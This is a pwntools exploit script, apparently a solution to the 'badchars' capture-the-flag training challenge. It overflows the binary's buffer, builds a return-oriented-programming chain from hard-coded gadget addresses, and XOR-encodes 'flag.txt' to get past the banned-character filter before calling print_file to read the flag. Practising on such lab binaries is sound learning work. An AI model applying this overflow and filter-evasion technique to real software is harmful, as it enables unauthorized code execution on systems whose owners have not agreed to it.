from pwn import *
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)
exe = './badchars'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

pop_r12_r13_r14_r15 = 0x40069c
# or use .bss section
data_section = 0x601030# NOTE: had to add 2 onto this to get it to work :S
mov_Pr13_r12 = 0x400634
pop_r14_r15 = 0x4006a0
xor_Pr15_r14 = 0x400628
pop_rdi = 0x4006a3
print_file = 0x400510

val_to_xor_with = 2
xored_str = xor('flag.txt', val_to_xor_with)

xor_data_section = b""
data_addr_offset = 0
for ch in xored_str:
	xor_data_section += p64(pop_r14_r15)
	xor_data_section += p64(val_to_xor_with)
	xor_data_section += p64(data_section + data_addr_offset)
	xor_data_section += p64(xor_Pr15_r14)
	data_addr_offset += 1
io = start()
payload = flat({
    40: [
    	pop_r12_r13_r14_r15,
    	xored_str,
    	data_section,
    	0x0,
    	0x0,
    	mov_Pr13_r12,

    	xor_data_section,

    	pop_rdi,
    	data_section,
    	print_file
    ]
})
write('payload', payload)
io.sendlineafter('>', payload)
io.recvuntil('Thank you!\n')
print(io.recvline())